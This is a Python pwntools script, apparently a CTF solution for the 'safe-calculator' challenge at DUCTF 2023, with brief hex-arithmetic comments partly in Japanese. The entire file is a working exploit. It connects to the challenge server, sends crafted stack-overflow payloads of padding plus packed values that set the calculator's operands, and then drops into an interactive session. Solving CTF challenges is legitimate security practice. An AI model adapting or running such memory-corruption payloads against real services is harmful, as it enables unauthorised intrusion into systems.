# calculateに持っていけるのは末尾の16文字
# 0x7ffeb15f5a30

 
# 0xAAAAAAAAAAAAAAAA + 0xAAAAA00AAAAAAAAA == 0xb98c5f3700002329
# 0xAAAAAAAA00001df0 + 0xAAAAAAAA00000539 == 0xb98c5f3700002329
# 0x5c462f375c462f37 + 0x5d46300000000000
# 0xb98c5f37
# 0xb9 0x8c 0x5f 0x37
# 0x5c462f37 + 0x5d463000

from pwn import *


io = remote('2023.ductf.dev', '30015')
# io = process('safe-calculator')
# io = gdb.debug('./safe-calculator', """
#     start
#     b *calculate+100
# """)
# io = process('safe-calculator')
context.binary = 'safe-calculator'

io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b':')
payload = b'A' * (48 - 16)
payload += pack(0x5c462f375c462f37) + b'AAAAA\x30\x46\x5d'
io.sendline(payload)

io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b':')
payload = b'A' * (48 - 16)
payload += pack(0x5c462f375c462f37) + b'AAAA'
io.sendline(payload)

io.recvuntil(b'>')
io.sendline(b'1')
io.interactive()
